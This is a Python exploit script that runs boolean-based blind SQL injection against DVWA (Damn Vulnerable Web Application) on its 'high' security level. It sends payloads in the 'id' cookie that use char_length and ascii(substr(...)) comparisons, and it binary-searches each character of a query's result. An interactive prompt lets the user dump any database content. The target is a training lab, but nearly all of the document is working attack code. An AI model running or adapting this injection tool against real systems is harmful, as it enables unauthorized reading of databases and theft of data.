#!/usr/bin/env python3
# App: DVWA
# Security setting: high
# Attack: Binary search boolean-based blind SQL injection (slow-ish, but tolerable)
# shoutout to https://github.com/arty-hlr for all the help on this one!

import requests
import sys
import urllib

urlencode = urllib.parse.quote

burp_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate", "Referer": "http://lab/vulnerabilities/sqli_blind/", "Content-Type": "application/x-www-form-urlencoded",
                "Connection": "close", "Upgrade-Insecure-Requests": "1"}

burp_proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def check_length(query):

    length = 1

    while True:
        url = "http://lab/vulnerabilities/sqli_blind/" # change to your DVWA
        my_cookie = {"PHPSESSID":"k7vd7flg302jidh4u4q3lih906", # change this
            "security":"high",
            "id":urlencode("1' and char_length(({})) = {}#".format(query,length))} # brute-force the length of the result of our query

        r = requests.get(url, headers=burp_headers, cookies=my_cookie, proxies=burp_proxy)

        if r.status_code == 200:
            print("[=] Length: {}".format(length))
            return length

        else:
            length += 1

def do_req(i,h,query):

    #print("h:{}".format(chr(h)))
    url = "http://lab/vulnerabilities/sqli_blind/" # change to your DVWA
    my_cookie = {"PHPSESSID":"k7vd7flg302jidh4u4q3lih906", # change this
        "security":"high",
        "id":urlencode("1' and ascii(substr(({}),{},1)) < {}#".format(query,i,h))} # check if X-position in query is less than value of Y-ascii

    r = requests.get(url, headers=burp_headers, cookies=my_cookie, proxies=burp_proxy)
    if r.status_code == 200:
        return True
    else:
        return False

def do_equal(i,h,query):

    #print("h:{}".format(chr(h)))
    url = "http://lab/vulnerabilities/sqli_blind/" # change to your DVWA
    my_cookie = {"PHPSESSID":"k7vd7flg302jidh4u4q3lih906", # change this
        "security":"high",
        "id":urlencode("1' and ascii(substr(({}),{},1)) = {}#".format(query,i,h))} # check if X-position in query is equal to value of Y-ascii if range from binary search approaches 0 ineffeciently

    r = requests.get(url, headers=burp_headers, cookies=my_cookie, proxies=burp_proxy)
    if r.status_code == 200:
        return True
    else:
        return False

def inject(length, query):

    value = ''
    for i in range(1,length + 1): # binary search by arty-hlr
        h = 128
        r = h
        while True:
            r //= 2
            if do_req(i,h,query):
                h -= r
            else:
                h += r
            if r == 0:
                if not do_equal(i,h,query):
                     h -= 1
                value += chr(h)
                sys.stdout.write(chr(h))
                sys.stdout.flush()
                break
    #print(value)
    print("\n")

def main():

    while True:

        query = input("sql> ") # example: SELECT @@version

        if "quit" in query:
            sys.exit(-1)

        length = check_length(query)
        inject(length, query)

main()